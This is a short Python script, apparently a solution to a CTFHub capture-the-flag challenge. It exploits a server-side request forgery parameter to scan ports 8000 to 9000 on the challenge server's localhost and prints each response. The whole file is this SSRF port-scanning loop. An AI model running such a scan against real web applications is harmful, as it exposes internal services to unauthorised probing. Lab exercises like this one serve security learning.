import requests


for i in range(8000, 9001):
    url = f'http://challenge-5dd092955dc2aaf9.sandbox.ctfhub.com:10800/?url=127.0.0.1:{i}'
    resp = requests.get(url)
    print(str(i) + ':' + resp.text)